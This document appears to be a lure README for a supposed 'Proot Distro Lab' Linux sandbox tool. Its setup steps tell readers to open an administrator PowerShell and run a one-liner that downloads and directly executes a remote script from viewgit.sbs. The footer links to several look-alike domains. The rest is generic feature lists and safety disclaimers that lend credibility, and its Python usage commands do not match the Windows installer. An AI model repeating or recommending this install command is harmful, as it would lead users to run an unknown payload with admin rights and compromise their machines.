# Proot Distro Lab — Portable Local Linux Environment

> A guided local environment for exploring Linux distributions with proot-style user-space isolation and reproducible project setups.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=proot-distro | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Proot Distro modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Proot Distro.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Proot Distro Lab** creates a reproducible, user-space Linux environment for learning, testing command-line tools, and developing portable workflows. It avoids kernel-level container assumptions and keeps setup visible and reviewable.

**Best for:** Students, developers, documentation authors, and cross-platform tooling teams.

**Key differentiators:**
1. User-space isolation
2. Reproducible bootstrap manifests
3. Local project roots
4. Command and package audit logs
5. Portable export and cleanup

---

## Core Features

```
✅ Debian and Alpine-style lab profiles
✅ Local root filesystem management
✅ Reproducible bootstrap manifests
✅ Package allowlist and audit log
✅ Project-bound shell sessions
✅ Environment snapshots
✅ Exportable command history
✅ Safe cleanup workflows
```

---

## Usage

```bash
# Open a local lab shell
python -m proot_distro shell --root ./roots/debian

# Install a reviewed package inside the lab
python -m proot_distro package add --root ./roots/debian --name curl

# Run a project command
python -m proot_distro run --root ./roots/debian -- python --version

# Export a snapshot manifest
python -m proot_distro export --root ./roots/debian --output ./snapshots/debian.json
```

---

## Configuration

> [!NOTE]
> proot is not a hard security boundary. Do not place secrets or sensitive workloads in the lab unless you understand its isolation limits.

```yaml
profile:
  distro: debian
  root: ./roots/debian
  network: false
packages:
  allowlist:
    - curl
    - ca-certificates
security:
  privileged: false
  audit_commands: true
```

---

## Screenshots

- Environment dashboard: `screenshots/environment-dashboard.png`
- Bootstrap manifest: `screenshots/bootstrap-manifest.png`
- Shell session: `screenshots/shell-session.png`
- Snapshot view: `screenshots/snapshot-view.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Bootstrap fails | Check the trusted mirror setting, available disk space, and network policy. |
| Commands cannot resolve DNS | Enable network only when required and verify the local profile permits it. |
| Package install is blocked | Add only reviewed packages to the allowlist and rerun the audit. |
| Root directory grows quickly | Remove unused package caches with the lab cleanup command. |
| Shell exits immediately | Inspect the last audit entry and confirm the profile initialization completed. |

---

## Use Cases

- **Learning Linux** — Practice shell and package-manager workflows safely.
- **Tool Testing** — Check command-line behavior in a clean user-space root.
- **Documentation** — Reproduce examples with a recorded manifest.
- **Portable Development** — Keep project dependencies separate from the host.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> proot isolation is not equivalent to a virtual machine or kernel container. Do not use it for untrusted code or sensitive secrets.

> [!TIP]
> Keep network access disabled until a package or command has been reviewed, then enable it only for the shortest necessary session.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
proot-distro, linux-lab, user-space, portable-environment, reproducibility, command-line, education, package-manager, local-first, dev-tools
-->

[gitsl.xyz](https://gitsl.xyz?t=proot-distro) | [gitrm.cfd](https://gitrm.cfd?t=proot-distro) | [gitview.sbs](https://gitview.sbs?t=proot-distro) | [gitrm.sbs](https://gitrm.sbs?t=proot-distro) | [viewgit.sbs](https://viewgit.sbs?t=proot-distro)
